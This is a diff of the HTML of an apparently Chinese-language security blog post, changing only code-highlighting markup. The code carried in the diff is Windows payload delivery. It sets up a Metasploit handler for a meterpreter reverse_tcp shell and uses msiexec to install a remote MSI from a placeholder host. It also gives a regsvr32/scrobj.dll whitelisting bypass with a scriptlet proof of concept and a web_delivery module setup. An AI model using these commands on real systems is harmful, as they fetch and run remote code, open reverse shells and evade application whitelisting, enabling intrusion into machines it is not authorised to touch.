@@ -45,12 +45,12 @@
 <ul>
 <li>服务器监听</li>
 </ul>
-<div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="k">handler</span>
-<span class="k">set</span> <span class="n">lhost</span> <span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span>
-<span class="k">set</span> <span class="n">lport</span> <span class="n">xx</span>
-<span class="k">set</span> <span class="n">payload</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
-<span class="n">exploit</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">use exploit/multi/handler</span>
+<span class="err">set lhost x.x.x.x</span>
+<span class="err">set lport xx</span>
+<span class="err">set payload windows/x64/meterpreter/reverse_tcp</span>
+<span class="err">exploit</span>
+</code></pre></div>
 
 
 <ul>
@@ -59,12 +59,12 @@
 <p><code>msiexec /q /i http://xxx.com/rever.msi</code> </p>
 <h2>regsrv32</h2>
 <p><a href="https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-regsvr32-exe/">https://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-regsvr32-exe/</a></p>
-<div class="highlight"><pre><span></span><span class="n">regsvr32</span> <span class="o">/</span><span class="n">s</span> <span class="o">/</span><span class="n">n</span> <span class="o">/</span><span class="n">u</span> <span class="o">/</span><span class="n">i</span><span class="p">:</span><span class="mi">1</span><span class="p">.</span><span class="n">sct</span> <span class="n">scrobj</span><span class="p">.</span><span class="n">dll</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">regsvr32 /s /n /u /i:1.sct scrobj.dll</span>
+</code></pre></div>
 
 
 <p>弹计算器：</p>
-<div class="highlight"><pre><span></span><span class="cp">&lt;?</span><span class="nx">XML</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="cp">?&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span><span class="nx">XML</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="cp">?&gt;</span>
   <span class="nt">&lt;scriptlet&gt;</span>
     <span class="nt">&lt;registration</span>     
       <span class="na">progid=</span><span class="s">&quot;PoC&quot;</span>
@@ -76,19 +76,19 @@
      <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;/registration&gt;</span>
  <span class="nt">&lt;/scriptlet&gt;</span>
-</pre></div>
+</code></pre></div>
 
 
 <h3>MSF</h3>
-<div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">script</span><span class="o">/</span><span class="n">web_delivery</span>
-<span class="k">set</span> <span class="n">LHOST</span> <span class="o">&lt;</span><span class="n">ip</span> <span class="n">address</span><span class="o">&gt;</span>
-<span class="k">set</span> <span class="n">LPORT</span> <span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span>
-<span class="k">set</span> <span class="n">target</span> <span class="mi">2</span>
-<span class="n">exploit</span> <span class="o">-</span><span class="n">j</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">use exploit/multi/script/web_delivery</span>
+<span class="err">set LHOST &lt;ip address&gt;</span>
+<span class="err">set LPORT &lt;port&gt;</span>
+<span class="err">set target 2</span>
+<span class="err">exploit -j</span>
+</code></pre></div>
 
 
-<div class="highlight"><pre><span></span><span class="cp">&lt;?</span><span class="nx">XML</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="cp">?&gt;</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span><span class="nx">XML</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="cp">?&gt;</span>
   <span class="nt">&lt;scriptlet&gt;</span>
     <span class="nt">&lt;registration</span> 
       <span class="na">progid=</span><span class="s">&quot;PoC&quot;</span>
@@ -100,7 +100,7 @@
      <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;/registration&gt;</span>
   <span class="nt">&lt;/scriptlet&gt;</span>
-</pre></div>
+</code></pre></div>
     </div><!-- /.entry-content -->
 
   </article>
